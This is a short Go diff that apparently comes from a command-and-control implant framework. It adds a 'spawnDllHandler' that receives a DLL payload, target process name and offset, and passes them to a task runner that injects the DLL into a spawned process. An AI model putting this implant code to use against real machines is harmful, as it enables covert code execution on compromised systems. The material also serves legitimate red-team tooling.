@@ -42,6 +42,7 @@ var (
 		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
 		pb.MsgMigrateReq:         migrateHandler,
 		pb.MsgSideloadReq:        sideloadHandler,
+		pb.MsgSpawnDllReq:        spawnDllHandler,
 
 		// Generic
 		pb.MsgPsReq:       psHandler,
@@ -206,4 +207,30 @@ func sideloadHandler(data []byte, resp RPCResponse) {
 	data, err = proto.Marshal(sideloadResp)
 	resp(data, err)
 
+}
+
+func spawnDllHandler(data []byte, resp RPCResponse) {
+	spawnReq := &pb.SpawnDllReq{}
+	err := proto.Unmarshal(data, spawnReq)
+
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	//{{if .Debug}}
+	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.ProcName, spawnReq.Offset, spawnReq.Args)
+	//{{end}}
+	result, err := taskrunner.SpawnDll(spawnReq.ProcName, spawnReq.Data, spawnReq.Offset, spawnReq.Args)
+	errStr := ""
+	if err != nil {
+		errStr = err.Error()
+	}
+	spawnResp := &pb.SpawnDll{
+		Result: result,
+		Error:  errStr,
+	}
+	data, err = proto.Marshal(spawnResp)
+	resp(data, err)
 }
